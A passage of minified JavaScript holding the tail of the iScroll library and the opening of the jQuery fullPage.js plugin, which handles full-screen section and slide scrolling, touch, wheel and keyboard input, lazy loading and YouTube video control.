                            break;
                        default:
                            return
                    }
                    s ? this.goToPage(n, o) : (0 < n ? this.keyAcceleration = n = 0 : n < this.maxScrollX && (n = this.maxScrollX, this.keyAcceleration = 0), 0 < o ? this.keyAcceleration = o = 0 : o < this.maxScrollY && (o = this.maxScrollY, this.keyAcceleration = 0), this.scrollTo(n, o, 0), this.keyTime = r)
                }
            },
            _animate: function(t, e, i, s) {
                var n = this,
                    o = this.x,
                    l = this.y,
                    c = a.getTime(),
                    d = c + i;
                this.isAnimating = !0,
                    function h() {
                        var u, p = a.getTime();
                        p >= d ? (n.isAnimating = !1, n._translate(t, e), n.resetPosition(n.options.bounceTime) || n._execEvent("scrollEnd")) : (u = s(p = (p - c) / i), p = (t - o) * u + o, u = (e - l) * u + l, n._translate(p, u), n.isAnimating && r(h))
                    }()
            },
            handleEvent: function(t) {
                switch (t.type) {
                    case "touchstart":
                    case "pointerdown":
                    case "MSPointerDown":
                    case "mousedown":
                        this._start(t);
                        break;
                    case "touchmove":
                    case "pointermove":
                    case "MSPointerMove":
                    case "mousemove":
                        this._move(t);
                        break;
                    case "touchend":
                    case "pointerup":
                    case "MSPointerUp":
                    case "mouseup":
                    case "touchcancel":
                    case "pointercancel":
                    case "MSPointerCancel":
                    case "mousecancel":
                        this._end(t);
                        break;
                    case "orientationchange":
                    case "resize":
                        this._resize();
                        break;
                    case "transitionend":
                    case "webkitTransitionEnd":
                    case "oTransitionEnd":
                    case "MSTransitionEnd":
                        this._transitionEnd(t);
                        break;
                    case "wheel":
                    case "DOMMouseScroll":
                    case "mousewheel":
                        this._wheel(t);
                        break;
                    case "keydown":
                        this._key(t);
                        break;
                    case "click":
                        this.enabled && !t._constructed && (t.preventDefault(), t.stopPropagation())
                }
            }
        }, o.prototype = {
            handleEvent: function(t) {
                switch (t.type) {
                    case "touchstart":
                    case "pointerdown":
                    case "MSPointerDown":
                    case "mousedown":
                        this._start(t);
                        break;
                    case "touchmove":
                    case "pointermove":
                    case "MSPointerMove":
                    case "mousemove":
                        this._move(t);
                        break;
                    case "touchend":
                    case "pointerup":
                    case "MSPointerUp":
                    case "mouseup":
                    case "touchcancel":
                    case "pointercancel":
                    case "MSPointerCancel":
                    case "mousecancel":
                        this._end(t)
                }
            },
            destroy: function() {
                this.options.fadeScrollbars && (clearTimeout(this.fadeTimeout), this.fadeTimeout = null), this.options.interactive && (a.removeEvent(this.indicator, "touchstart", this), a.removeEvent(this.indicator, a.prefixPointerEvent("pointerdown"), this), a.removeEvent(this.indicator, "mousedown", this), a.removeEvent(t, "touchmove", this), a.removeEvent(t, a.prefixPointerEvent("pointermove"), this), a.removeEvent(t, "mousemove", this), a.removeEvent(t, "touchend", this), a.removeEvent(t, a.prefixPointerEvent("pointerup"), this), a.removeEvent(t, "mouseup", this)), this.options.defaultScrollbars && this.wrapper.parentNode.removeChild(this.wrapper)
            },
            _start: function(e) {
                var i = e.touches ? e.touches[0] : e;
                e.preventDefault(), e.stopPropagation(), this.transitionTime(), this.initiated = !0, this.moved = !1, this.lastPointX = i.pageX, this.lastPointY = i.pageY, this.startTime = a.getTime(), this.options.disableTouch || a.addEvent(t, "touchmove", this), this.options.disablePointer || a.addEvent(t, a.prefixPointerEvent("pointermove"), this), this.options.disableMouse || a.addEvent(t, "mousemove", this), this.scroller._execEvent("beforeScrollStart")
            },
            _move: function(t) {
                var e, i, s = t.touches ? t.touches[0] : t;
                a.getTime(), this.moved || this.scroller._execEvent("scrollStart"), this.moved = !0, e = s.pageX - this.lastPointX, this.lastPointX = s.pageX, i = s.pageY - this.lastPointY, this.lastPointY = s.pageY, this._pos(this.x + e, this.y + i), t.preventDefault(), t.stopPropagation()
            },
            _end: function(e) {
                if (this.initiated) {
                    if (this.initiated = !1, e.preventDefault(), e.stopPropagation(), a.removeEvent(t, "touchmove", this), a.removeEvent(t, a.prefixPointerEvent("pointermove"), this), a.removeEvent(t, "mousemove", this), this.scroller.options.snap) {
                        e = this.scroller._nearestSnap(this.scroller.x, this.scroller.y);
                        var s = this.options.snapSpeed || i.max(i.max(i.min(i.abs(this.scroller.x - e.x), 1e3), i.min(i.abs(this.scroller.y - e.y), 1e3)), 300);
                        this.scroller.x == e.x && this.scroller.y == e.y || (this.scroller.directionX = 0, this.scroller.directionY = 0, this.scroller.currentPage = e, this.scroller.scrollTo(e.x, e.y, s, this.scroller.options.bounceEasing))
                    }
                    this.moved && this.scroller._execEvent("scrollEnd")
                }
            },
            transitionTime: function(t) {
                t = t || 0;
                var e = a.style.transitionDuration;
                if (e && (this.indicatorStyle[e] = t + "ms", !t && a.isBadAndroid)) {
                    this.indicatorStyle[e] = "0.0001ms";
                    var i = this;
                    r((function() {
                        "0.0001ms" === i.indicatorStyle[e] && (i.indicatorStyle[e] = "0s")
                    }))
                }
            },
            transitionTimingFunction: function(t) {
                this.indicatorStyle[a.style.transitionTimingFunction] = t
            },
            refresh: function() {
                this.transitionTime(), this.indicatorStyle.display = this.options.listenX && !this.options.listenY ? this.scroller.hasHorizontalScroll ? "block" : "none" : this.options.listenY && !this.options.listenX ? this.scroller.hasVerticalScroll ? "block" : "none" : this.scroller.hasHorizontalScroll || this.scroller.hasVerticalScroll ? "block" : "none", this.scroller.hasHorizontalScroll && this.scroller.hasVerticalScroll ? (a.addClass(this.wrapper, "iScrollBothScrollbars"), a.removeClass(this.wrapper, "iScrollLoneScrollbar"), this.options.defaultScrollbars && this.options.customStyle && (this.options.listenX ? this.wrapper.style.right = "8px" : this.wrapper.style.bottom = "8px")) : (a.removeClass(this.wrapper, "iScrollBothScrollbars"), a.addClass(this.wrapper, "iScrollLoneScrollbar"), this.options.defaultScrollbars && this.options.customStyle && (this.options.listenX ? this.wrapper.style.right = "2px" : this.wrapper.style.bottom = "2px")), this.options.listenX && (this.wrapperWidth = this.wrapper.clientWidth, this.options.resize ? (this.indicatorWidth = i.max(i.round(this.wrapperWidth * this.wrapperWidth / (this.scroller.scrollerWidth || this.wrapperWidth || 1)), 8), this.indicatorStyle.width = this.indicatorWidth + "px") : this.indicatorWidth = this.indicator.clientWidth, this.maxPosX = this.wrapperWidth - this.indicatorWidth, "clip" == this.options.shrink ? (this.minBoundaryX = 8 - this.indicatorWidth, this.maxBoundaryX = this.wrapperWidth - 8) : (this.minBoundaryX = 0, this.maxBoundaryX = this.maxPosX), this.sizeRatioX = this.options.speedRatioX || this.scroller.maxScrollX && this.maxPosX / this.scroller.maxScrollX), this.options.listenY && (this.wrapperHeight = this.wrapper.clientHeight, this.options.resize ? (this.indicatorHeight = i.max(i.round(this.wrapperHeight * this.wrapperHeight / (this.scroller.scrollerHeight || this.wrapperHeight || 1)), 8), this.indicatorStyle.height = this.indicatorHeight + "px") : this.indicatorHeight = this.indicator.clientHeight, this.maxPosY = this.wrapperHeight - this.indicatorHeight, "clip" == this.options.shrink ? (this.minBoundaryY = 8 - this.indicatorHeight, this.maxBoundaryY = this.wrapperHeight - 8) : (this.minBoundaryY = 0, this.maxBoundaryY = this.maxPosY), this.maxPosY = this.wrapperHeight - this.indicatorHeight, this.sizeRatioY = this.options.speedRatioY || this.scroller.maxScrollY && this.maxPosY / this.scroller.maxScrollY), this.updatePosition()
            },
            updatePosition: function() {
                var t = this.options.listenX && i.round(this.sizeRatioX * this.scroller.x) || 0,
                    e = this.options.listenY && i.round(this.sizeRatioY * this.scroller.y) || 0;
                this.options.ignoreBoundaries || (t < this.minBoundaryX ? ("scale" == this.options.shrink && (this.width = i.max(this.indicatorWidth + t, 8), this.indicatorStyle.width = this.width + "px"), t = this.minBoundaryX) : t > this.maxBoundaryX ? "scale" == this.options.shrink ? (this.width = i.max(this.indicatorWidth - (t - this.maxPosX), 8), this.indicatorStyle.width = this.width + "px", t = this.maxPosX + this.indicatorWidth - this.width) : t = this.maxBoundaryX : "scale" == this.options.shrink && this.width != this.indicatorWidth && (this.width = this.indicatorWidth, this.indicatorStyle.width = this.width + "px"), e < this.minBoundaryY ? ("scale" == this.options.shrink && (this.height = i.max(this.indicatorHeight + 3 * e, 8), this.indicatorStyle.height = this.height + "px"), e = this.minBoundaryY) : e > this.maxBoundaryY ? "scale" == this.options.shrink ? (this.height = i.max(this.indicatorHeight - 3 * (e - this.maxPosY), 8), this.indicatorStyle.height = this.height + "px", e = this.maxPosY + this.indicatorHeight - this.height) : e = this.maxBoundaryY : "scale" == this.options.shrink && this.height != this.indicatorHeight && (this.height = this.indicatorHeight, this.indicatorStyle.height = this.height + "px")), this.x = t, this.y = e, this.scroller.options.useTransform ? this.indicatorStyle[a.style.transform] = "translate(" + t + "px," + e + "px)" + this.scroller.translateZ : (this.indicatorStyle.left = t + "px", this.indicatorStyle.top = e + "px")
            },
            _pos: function(t, e) {
                0 > t ? t = 0 : t > this.maxPosX && (t = this.maxPosX), 0 > e ? e = 0 : e > this.maxPosY && (e = this.maxPosY), t = this.options.listenX ? i.round(t / this.sizeRatioX) : this.scroller.x, e = this.options.listenY ? i.round(e / this.sizeRatioY) : this.scroller.y, this.scroller.scrollTo(t, e)
            },
            fade: function(t, e) {
                if (!e || this.visible) {
                    clearTimeout(this.fadeTimeout), this.fadeTimeout = null;
                    var i = t ? 0 : 300;
                    this.wrapperStyle[a.style.transitionDuration] = (t ? 250 : 500) + "ms", this.fadeTimeout = setTimeout(function(t) {
                        this.wrapperStyle.opacity = t, this.visible = +t
                    }.bind(this, t ? "1" : "0"), i)
                }
            }
        }, s.utils = a, "undefined" != typeof module && module.exports ? module.exports = s : "function" == typeof define && define.amd ? define((function() {
            return s
        })) : t.IScroll = s
    }(window, document, Math),
    function(t, e) {
        "use strict";
        "function" == typeof define && define.amd ? define(["jquery"], (function(i) {
            return e(i, t, t.document, t.Math)
        })) : "object" == typeof exports && exports ? module.exports = e(require("jquery"), t, t.document, t.Math) : e(jQuery, t, t.document, t.Math)
    }("undefined" != typeof window ? window : this, (function(t, e, i, s, n) {
        "use strict";
        var o = "fullpage-wrapper",
            r = "." + o,
            a = "fp-responsive",
            l = "fp-notransition",
            c = "fp-destroyed",
            d = "fp-enabled",
            h = "fp-viewing",
            u = "active",
            p = "." + u,
            f = "fp-completely",
            m = "fp-section",
            v = "." + m,
            g = v + p,
            y = "fp-tableCell",
            b = "." + y,
            w = "fp-nav",
            x = "#" + w,
            S = "fp-tooltip",
            k = "fp-show-active",
            T = "fp-slide",
            C = "." + T,
            _ = C + p,
            E = "fp-slides",
            P = "." + E,
            A = "fp-slidesContainer",
            M = "." + A,
            $ = "fp-table",
            I = "fp-slidesNav",
            z = "." + I,
            L = z + " a",
            O = "fp-controlArrow",
            j = "." + O,
            H = "fp-prev",
            D = O + " " + H,
            F = j + ".fp-prev",
            R = "fp-next",
            X = O + " " + R,
            q = j + ".fp-next",
            B = t(e),
            Y = t(i);
        t.fn.fullpage = function(O) {
            function R(e, i) {
                e || le(0), he("autoScrolling", e, i);
                var s = t(g);
                O.autoScrolling && !O.scrollBar ? (fe.css({
                    overflow: "hidden",
                    height: "100%"
                }), W(Re.recordHistory, "internal"), Te.css({
                    "-ms-touch-action": "none",
                    "touch-action": "none"
                }), s.length && le(s.position().top)) : (fe.css({
                    overflow: "visible",
                    height: "initial"
                }), W(!1, "internal"), Te.css({
                    "-ms-touch-action": "",
                    "touch-action": ""
                }), s.length && fe.scrollTop(s.position().top))
            }

            function W(t, e) {
                he("recordHistory", t, e)
            }

            function N(t, e) {
                he("scrollingSpeed", t, e)
            }

            function U(t, e) {
                he("fitToSection", t, e)
            }

            function V(t) {
                t ? (function() {
                    var t, s = "";
                    e.addEventListener ? t = "addEventListener" : (t = "attachEvent", s = "on");
                    var o = "onwheel" in i.createElement("div") ? "wheel" : i.onmousewheel !== n ? "mousewheel" : "DOMMouseScroll";
                    "DOMMouseScroll" == o ? i[t](s + "MozMousePixelScroll", ft, !1) : i[t](s + o, ft, !1)
                }(), Te.on("mousedown", It).on("mouseup", zt)) : (i.addEventListener ? (i.removeEventListener("mousewheel", ft, !1), i.removeEventListener("wheel", ft, !1), i.removeEventListener("MozMousePixelScroll", ft, !1)) : i.detachEvent("onmousewheel", ft), Te.off("mousedown", It).off("mouseup", zt))
            }

            function Q(e, i) {
                void 0 !== i ? (i = i.replace(/ /g, "").split(","), t.each(i, (function(t, i) {
                    de(e, i, "m")
                }))) : (de(e, "all", "m"), e ? (V(!0), (Se || ke) && (O.autoScrolling && me.off(Fe.touchmove).on(Fe.touchmove, ct), t(r).off(Fe.touchstart).on(Fe.touchstart, ut).off(Fe.touchmove).on(Fe.touchmove, dt))) : (V(!1), (Se || ke) && (O.autoScrolling && me.off(Fe.touchmove), t(r).off(Fe.touchstart).off(Fe.touchmove))))
            }

            function Z(e, i) {
                void 0 !== i ? (i = i.replace(/ /g, "").split(","), t.each(i, (function(t, i) {
                    de(e, i, "k")
                }))) : (de(e, "all", "k"), O.keyboardScrolling = e)
            }

            function K() {
                var e = t(g).prev(v);
                e.length || !O.loopTop && !O.continuousVertical || (e = t(v).last()), e.length && gt(e, null, !0)
            }

            function J() {
                var e = t(g).next(v);
                e.length || !O.loopBottom && !O.continuousVertical || (e = t(v).first()), e.length && gt(e, null, !1)
            }

            function G(t, e) {
                N(0, "internal"), tt(t, e), N(Re.scrollingSpeed, "internal")
            }

            function tt(t, e) {
                var i = Gt(t);
                void 0 !== e ? te(t, e) : i.length > 0 && gt(i)
            }

            function et(t) {
                mt("right", t)
            }

            function it(t) {
                mt("left", t)
            }

            function st(e) {
                if (!Te.hasClass(c)) {
                    _e = !0, Ce = B.height(), t(v).each((function() {
                        var e = t(this).find(P),
                            i = t(this).find(C);
                        O.verticalCentered && t(this).find(b).css("height", Kt(t(this)) + "px"), t(this).css("height", Ce + "px"), i.length > 1 && Ft(e, e.find(_))
                    })), O.scrollOverflow && $e.createScrollBarForAll();
                    var i = t(g).index(v);
                    i && G(i + 1), _e = !1, t.isFunction(O.afterResize) && e && O.afterResize.call(Te), t.isFunction(O.afterReBuild) && !e && O.afterReBuild.call(Te)
                }
            }

            function nt(e) {
                var i = me.hasClass(a);
                e ? i || (R(!1, "internal"), U(!1, "internal"), t(x).hide(), me.addClass(a), t.isFunction(O.afterResponsive) && O.afterResponsive.call(Te, e)) : i && (R(Re.autoScrolling, "internal"), U(Re.autoScrolling, "internal"), t(x).show(), me.removeClass(a), t.isFunction(O.afterResponsive) && O.afterResponsive.call(Te, e))
            }

            function ot() {
                var e = t(g);
                e.addClass(f), xt(e), St(e), O.scrollOverflow && O.scrollOverflowHandler.afterLoad(),
                function() {
                    var t = Gt(Pt().section);
                    return !t.length || t.length && t.index() === we.index()
                }() && t.isFunction(O.afterLoad) && O.afterLoad.call(e, e.data("anchor"), e.index(v) + 1), t.isFunction(O.afterRender) && O.afterRender.call(Te)
            }

            function rt() {
                var e;
                if (!O.autoScrolling || O.scrollBar) {
                    var s = B.scrollTop(),
                        n = function(t) {
                            var e = t > qe ? "down" : "up";
                            return qe = t, Ve = t, e
                        }(s),
                        o = 0,
                        r = s + B.height() / 2,
                        a = me.height() - B.height() === s,
                        l = i.querySelectorAll(v);
                    if (a) o = l.length - 1;
                    else if (s)
                        for (var c = 0; c < l.length; ++c) {
                            l[c].offsetTop <= r && (o = c)
                        } else o = 0;
                    if (function(e) {
                        var i = t(g).position().top,
                            s = i + B.height();
                        return "up" == e ? s >= B.scrollTop() + B.height() : i <= B.scrollTop()
                    }(n) && (t(g).hasClass(f) || t(g).addClass(f).siblings().removeClass(f)), !(e = t(l).eq(o)).hasClass(u)) {
                        Xe = !0;
                        var d, h, p = t(g),
                            m = p.index(v) + 1,
                            y = Qt(e),
                            b = e.data("anchor"),
                            w = e.index(v) + 1,
                            x = e.find(_);
                        x.length && (h = x.data("anchor"), d = x.index()), Pe && (e.addClass(u).siblings().removeClass(u), t.isFunction(O.onLeave) && O.onLeave.call(p, m, w, y), t.isFunction(O.afterLoad) && O.afterLoad.call(e, b, w), Tt(p), xt(e), St(e), Vt(b, w - 1), O.anchors.length && (ge = b), ie(d, h, b, w)), clearTimeout(Oe), Oe = setTimeout((function() {
                            Xe = !1
                        }), 100)
                    }
                    O.fitToSection && (clearTimeout(je), je = setTimeout((function() {
                        O.fitToSection && t(g).outerHeight() <= Ce && at()
                    }), O.fitToSectionDelay))
                }
            }

            function at() {
                Pe && (_e = !0, gt(t(g)), _e = !1)
            }

            function lt(e) {
                if (Me.m[e]) {
                    var i = "down" === e ? J : K;
                    if (O.scrollOverflow) {
                        var s = O.scrollOverflowHandler.scrollable(t(g)),
                            n = "down" === e ? "bottom" : "top";
                        if (s.length > 0) {
                            if (!O.scrollOverflowHandler.isScrolled(n, s)) return !0;
                            i()
                        } else i()
                    } else i()
                }
            }

            function ct(t) {
                var e = t.originalEvent;
                O.autoScrolling && ht(e) && t.preventDefault()
            }

            function dt(e) {
                var i = e.originalEvent,
                    n = t(i.target).closest(v);
                if (ht(i)) {
                    O.autoScrolling && e.preventDefault();
                    var o = re(i);
                    We = o.y, Ne = o.x, n.find(P).length && s.abs(Ye - Ne) > s.abs(Be - We) ? !xe && s.abs(Ye - Ne) > B.outerWidth() / 100 * O.touchSensitivity && (Ye > Ne ? Me.m.right && et(n) : Me.m.left && it(n)) : O.autoScrolling && Pe && s.abs(Be - We) > B.height() / 100 * O.touchSensitivity && (Be > We ? lt("down") : We > Be && lt("up"))
                }
            }

            function ht(t) {
                return void 0 === t.pointerType || "mouse" != t.pointerType
            }

            function ut(t) {
                var e = t.originalEvent;
                if (O.fitToSection && fe.stop(), ht(e)) {
                    var i = re(e);
                    Be = i.y, Ye = i.x
                }
            }

            function pt(t, e) {
                for (var i = 0, n = t.slice(s.max(t.length - e, 1)), o = 0; o < n.length; o++) i += n[o];
                return s.ceil(i / e)
            }

            function ft(i) {
                var n = (new Date).getTime(),
                    o = t(".fp-completely").hasClass("fp-normal-scroll");
                if (O.autoScrolling && !be && !o) {
                    var r = (i = i || e.event).wheelDelta || -i.deltaY || -i.detail,
                        a = s.max(-1, s.min(1, r)),
                        l = void 0 !== i.wheelDeltaX || void 0 !== i.deltaX,
                        c = s.abs(i.wheelDeltaX) < s.abs(i.wheelDelta) || s.abs(i.deltaX) < s.abs(i.deltaY) || !l;
                    Ae.length > 149 && Ae.shift(), Ae.push(s.abs(r)), O.scrollBar && (i.preventDefault ? i.preventDefault() : i.returnValue = !1);
                    var d = n - Ue;
                    if (Ue = n, d > 200 && (Ae = []), Pe) pt(Ae, 10) >= pt(Ae, 70) && c && lt(a < 0 ? "down" : "up");
                    return !1
                }
                O.fitToSection && fe.stop()
            }

            function mt(e, i) {
                var s = (void 0 === i ? t(g) : i).find(P),
                    n = s.find(C).length;
                if (!(!s.length || xe || n < 2)) {
                    var o = s.find(_),
                        r = null;
                    if (!(r = "left" === e ? o.prev(C) : o.next(C)).length) {
                        if (!O.loopHorizontal) return;
                        r = "left" === e ? o.siblings(":last") : o.siblings(":first")
                    }
                    xe = !0, Ft(s, r, e)
                }
            }

            function vt() {
                t(_).each((function() {
                    ae(t(this), "internal")
                }))
            }

            function gt(e, i, s) {
                if (void 0 !== e) {
                    var n, o, r = function(t) {
                            var e = t.position(),
                                i = e.top,
                                s = e.top > Ve,
                                n = i - Ce + t.outerHeight(),
                                o = O.bigSectionsDestination;
                            return t.outerHeight() > Ce ? (s || o) && "bottom" !== o || (i = n) : (s || _e && t.is(":last-child")) && (i = n), Ve = i, i
                        }(e),
                        a = {
                            element: e,
                            callback: i,
                            isMovementUp: s,
                            dtop: r,
                            yMovement: Qt(e),
                            anchorLink: e.data("anchor"),
                            sectionIndex: e.index(v),
                            activeSlide: e.find(_),
                            activeSection: t(g),
                            leavingSection: t(g).index(v) + 1,
                            localIsResizing: _e
                        };
                    a.activeSection.is(e) && !_e || O.scrollBar && B.scrollTop() === a.dtop && !e.hasClass("fp-auto-height") || (a.activeSlide.length && (n = a.activeSlide.data("anchor"), o = a.activeSlide.index()), t.isFunction(O.onLeave) && !a.localIsResizing && !1 === O.onLeave.call(a.activeSection, a.leavingSection, a.sectionIndex + 1, a.yMovement) || (O.autoScrolling && O.continuousVertical && void 0 !== a.isMovementUp && (!a.isMovementUp && "up" == a.yMovement || a.isMovementUp && "down" == a.yMovement) && (a = function(e) {
                        return e.isMovementUp ? t(g).before(e.activeSection.nextAll(v)) : t(g).after(e.activeSection.prevAll(v).get().reverse()), le(t(g).position().top), vt(), e.wrapAroundElements = e.activeSection, e.dtop = e.element.position().top, e.yMovement = Qt(e.element), e.leavingSection = e.activeSection.index(v) + 1, e.sectionIndex = e.element.index(v), e
                    }(a)), a.localIsResizing || Tt(a.activeSection), O.scrollOverflow && O.scrollOverflowHandler.beforeLeave(), e.addClass(u).siblings().removeClass(u), xt(e), O.scrollOverflow && O.scrollOverflowHandler.onLeave(), Pe = !1, ie(o, n, a.anchorLink, a.sectionIndex), yt(a), ge = a.anchorLink, Vt(a.anchorLink, a.sectionIndex)))
                }
            }

            function yt(e) {
                if (O.css3 && O.autoScrolling && !O.scrollBar) {
                    Jt("translate3d(0px, -" + s.round(e.dtop) + "px, 0px)", !0), O.scrollingSpeed ? (clearTimeout(ze), ze = setTimeout((function() {
                        bt(e)
                    }), O.scrollingSpeed)) : bt(e)
                } else {
                    var i = function(t) {
                        var e = {};
                        return O.autoScrolling && !O.scrollBar ? (e.options = {
                            top: -t.dtop
                        }, e.element = r) : (e.options = {
                            scrollTop: t.dtop
                        }, e.element = "html, body"), e
                    }(e);
                    t(i.element).animate(i.options, O.scrollingSpeed, O.easing).promise().done((function() {
                        O.scrollBar ? setTimeout((function() {
                            bt(e)
                        }), 30) : bt(e)
                    }))
                }
            }

            function bt(e) {
                (function(e) {
                    e.wrapAroundElements && e.wrapAroundElements.length && (e.isMovementUp ? t(".fp-section:first").before(e.wrapAroundElements) : t(".fp-section:last").after(e.wrapAroundElements), le(t(g).position().top), vt())
                })(e), t.isFunction(O.afterLoad) && !e.localIsResizing && O.afterLoad.call(e.element, e.anchorLink, e.sectionIndex + 1), O.scrollOverflow && O.scrollOverflowHandler.afterLoad(), e.localIsResizing || St(e.element), e.element.addClass(f).siblings().removeClass(f), Pe = !0, t.isFunction(e.callback) && e.callback.call(this)
            }

            function wt(t, e) {
                t.attr(e, t.data(e)).removeAttr("data-" + e)
            }

            function xt(e) {
                var i;
                O.lazyLoading && Ct(e).find("img[data-src], img[data-srcset], source[data-src], video[data-src], audio[data-src], iframe[data-src]").each((function() {
                    if (i = t(this), t.each(["src", "srcset"], (function(t, e) {
                        var s = i.attr("data-" + e);
                        void 0 !== s && s && wt(i, e)
                    })), i.is("source")) {
                        var e = i.closest("video").length ? "video" : "audio";
                        i.closest(e).get(0).load()
                    }
                }))
            }

            function St(e) {
                var i = Ct(e);
                i.find("video, audio").each((function() {
                    var e = t(this).get(0);
                    e.hasAttribute("data-autoplay") && "function" == typeof e.play && e.play()
                })), i.find('iframe[src*="youtube.com/embed/"]').each((function() {
                    var e = t(this).get(0);
                    e.hasAttribute("data-autoplay") && kt(e), e.onload = function() {
                        e.hasAttribute("data-autoplay") && kt(e)
                    }
                }))
            }

            function kt(t) {
                t.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', "*")
            }

            function Tt(e) {
                var i = Ct(e);
                i.find("video, audio").each((function() {
                    var e = t(this).get(0);
                    e.hasAttribute("data-keepplaying") || "function" != typeof e.pause || e.pause()
                })), i.find('iframe[src*="youtube.com/embed/"]').each((function() {
                    var e = t(this).get(0);
                    /youtube\.com\/embed\//.test(t(this).attr("src")) && !e.hasAttribute("data-keepplaying") && t(this).get(0).contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}', "*")
                }))
            }

            function Ct(e) {
                var i = e.find(_);
                return i.length && (e = t(i)), e
            }

            function _t() {
                var t = Pt(),
                    e = t.section,
                    i = t.slide;
                e && (O.animateAnchor ? te(e, i) : G(e, i))
            }

            function Et() {
                if (!Xe && !O.lockAnchors) {
                    var t = Pt(),
                        e = t.section,
                        i = t.slide,
                        s = void 0 === ge,
                        n = void 0 === ge && void 0 === i && !xe;
                    e.length && (e && e !== ge && !s || n || !xe && ye != i) && te(e, i)
                }
            }

            function Pt() {
                var t = e.location.hash,
                    i = t.replace("#", "").split("/"),
                    s = t.indexOf("#/") > -1;
                return {
                    section: s ? "/" + i[1] : decodeURIComponent(i[0]),
                    slide: s ? decodeURIComponent(i[2]) : decodeURIComponent(i[1])
                }
            }

            function At(e) {
                clearTimeout(He);
                var i = t(":focus");
                if (!i.is("textarea") && !i.is("input") && !i.is("select") && "true" !== i.attr("contentEditable") && "" !== i.attr("contentEditable") && O.keyboardScrolling && O.autoScrolling) {
                    var s = e.which;
                    t.inArray(s, [40, 38, 32, 33, 34]) > -1 && e.preventDefault(), be = e.ctrlKey, He = setTimeout((function() {
                        ! function(e) {
                            var i = e.shiftKey;
                            if (Pe || !([37, 39].indexOf(e.which) < 0)) switch (e.which) {
                                case 38:
                                case 33:
                                    Me.k.up && K();
                                    break;
                                case 32:
                                    if (i && Me.k.up) {
                                        K();
                                        break
                                    }
                                case 40:
                                case 34:
                                    Me.k.down && J();
                                    break;
                                case 36:
                                    Me.k.up && tt(1);
                                    break;
                                case 35:
                                    Me.k.down && tt(t(v).length);
                                    break;
                                case 37:
                                    Me.k.left && it();
                                    break;
                                case 39:
                                    Me.k.right && et();
                                    break;
                                default:
                                    ;
                            }
                        }(e)
                    }), 150)
                }
            }

            function Mt() {
                t(this).prev().trigger("click")
            }

            function $t(t) {
                Ee && (be = t.ctrlKey)
            }

            function It(t) {
                2 == t.which && (Qe = t.pageY, Te.on("mousemove", Dt))
            }

            function zt(t) {
                2 == t.which && Te.off("mousemove")
            }

            function Lt() {
                var e = t(this).closest(v);
                t(this).hasClass(H) ? Me.m.left && it(e) : Me.m.right && et(e)
            }

            function Ot() {
                Ee = !1, be = !1
            }

            function jt(e) {
                e.preventDefault();
                var i = t(this).parent().index();
                gt(t(v).eq(i))
            }

            function Ht(e) {
                e.preventDefault();
                var i = t(this).closest(v).find(P),
                    s = i.find(C).eq(t(this).closest("li").index());
                Ft(i, s)
            }

            function Dt(t) {
                Pe && (t.pageY < Qe && Me.m.up ? K() : t.pageY > Qe && Me.m.down && J()), Qe = t.pageY
            }

            function Ft(e, i, s) {
                var n = e.closest(v),
                    o = {
                        slides: e,
                        destiny: i,
                        direction: s,
                        destinyPos: i.position(),
                        slideIndex: i.index(),
                        section: n,
                        sectionIndex: n.index(v),
                        anchorLink: n.data("anchor"),
                        slidesNav: n.find(z),
                        slideAnchor: ne(i),
                        prevSlide: n.find(_),
                        prevSlideIndex: n.find(_).index(),
                        localIsResizing: _e
                    };
                return o.xMovement = function(t, e) {
                    return t == e ? "none" : t > e ? "left" : "right"
                }(o.prevSlideIndex, o.slideIndex), o.localIsResizing || (Pe = !1), O.onSlideLeave && !o.localIsResizing && "none" !== o.xMovement && t.isFunction(O.onSlideLeave) && !1 === O.onSlideLeave.call(o.prevSlide, o.anchorLink, o.sectionIndex + 1, o.prevSlideIndex, o.direction, o.slideIndex) ? void(xe = !1) : (i.addClass(u).siblings().removeClass(u), o.localIsResizing || (Tt(o.prevSlide), xt(i)), !O.loopHorizontal && O.controlArrows && (n.find(F).toggle(0 !== o.slideIndex), n.find(q).toggle(!i.is(":last-child"))), n.hasClass(u) && !o.localIsResizing && ie(o.slideIndex, o.slideAnchor, o.anchorLink, o.sectionIndex), void Xt(e, o, !0))
            }

            function Rt(e) {
                (function(t, e) {
                    t.find(p).removeClass(u), t.find("li").eq(e).find("a").addClass(u)
                })(e.slidesNav, e.slideIndex), e.localIsResizing || (t.isFunction(O.afterSlideLoad) && O.afterSlideLoad.call(e.destiny, e.anchorLink, e.sectionIndex + 1, e.slideAnchor, e.slideIndex), Pe = !0, St(e.destiny)), xe = !1
            }

            function Xt(t, e, i) {
                var n = e.destinyPos;
                if (O.css3) {
                    var o = "translate3d(-" + s.round(n.left) + "px, 0px, 0px)";
                    Yt(t.find(M)).css(ce(o)), Le = setTimeout((function() {
                        i && Rt(e)
                    }), O.scrollingSpeed, O.easing)
                } else t.animate({
                    scrollLeft: s.round(n.left)
                }, O.scrollingSpeed, O.easing, (function() {
                    i && Rt(e)
                }))
            }

            function qt() {
                if (Bt(), Se) {
                    var e = t(i.activeElement);
                    if (!e.is("textarea") && !e.is("input") && !e.is("select")) {
                        var n = B.height();
                        s.abs(n - Ze) > 20 * s.max(Ze, n) / 100 && (st(!0), Ze = n)
                    }
                } else clearTimeout(Ie), Ie = setTimeout((function() {
                    st(!0)
                }), 350)
            }

            function Bt() {
                var t = O.responsive || O.responsiveWidth,
                    e = O.responsiveHeight,
                    i = t && B.outerWidth() < t,
                    s = e && B.height() < e;
                t && e ? nt(i || s) : t ? nt(i) : e && nt(s)
            }

            function Yt(t) {
                var e = "all " + O.scrollingSpeed + "ms " + O.easingcss3;
                return t.removeClass(l), t.css({
                    "-webkit-transition": e,
                    transition: e
                })
            }

            function Wt(t) {
                return t.addClass(l)
            }

            function Nt(e, i) {
                O.navigation && (t(x).find(p).removeClass(u), e ? t(x).find('a[href="#' + e + '"]').addClass(u) : t(x).find("li").eq(i).find("a").addClass(u))
            }

            function Ut(e) {
                O.menu && (t(O.menu).find(p).removeClass(u), t(O.menu).find('[data-menuanchor="' + e + '"]').addClass(u))
            }

            function Vt(t, e) {
                Ut(t), Nt(t, e)
            }

            function Qt(e) {
                var i = t(g).index(v),
                    s = e.index(v);
                return i == s ? "none" : i > s ? "up" : "down"
            }

            function Zt(t) {
                t.hasClass($) || t.addClass($).wrapInner('<div class="' + y + '" style="height:' + Kt(t) + 'px;" />')
            }

            function Kt(t) {
                var e = Ce;
                if (O.paddingTop || O.paddingBottom) {
                    var i = t;
                    i.hasClass(m) || (i = t.closest(v));
